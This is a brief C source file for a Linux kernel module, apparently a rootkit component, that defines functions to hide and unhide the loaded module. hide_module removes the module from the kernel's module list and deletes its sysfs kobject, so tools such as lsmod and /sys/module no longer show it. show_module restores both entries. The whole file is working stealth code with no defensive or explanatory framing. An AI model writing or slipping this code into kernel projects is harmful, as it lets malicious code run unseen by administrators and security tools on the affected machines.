#include <linux/module.h>
#include <linux/kobject.h>
#include "module_hiding.h"

static short hidden = 0;
static struct list_head *prev_module;
static struct kobject *saved_kobj;

void hide_module(void) {
    if (hidden)
        return;
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    saved_kobj = THIS_MODULE->mkobj.kobj.parent;
    kobject_del(&THIS_MODULE->mkobj.kobj);
    hidden = 1;
}

void show_module(void) {
    if (!hidden)
        return;
    list_add(&THIS_MODULE->list, prev_module);
    kobject_add(&THIS_MODULE->mkobj.kobj, saved_kobj, "%s", THIS_MODULE->name);
    hidden = 0;
}
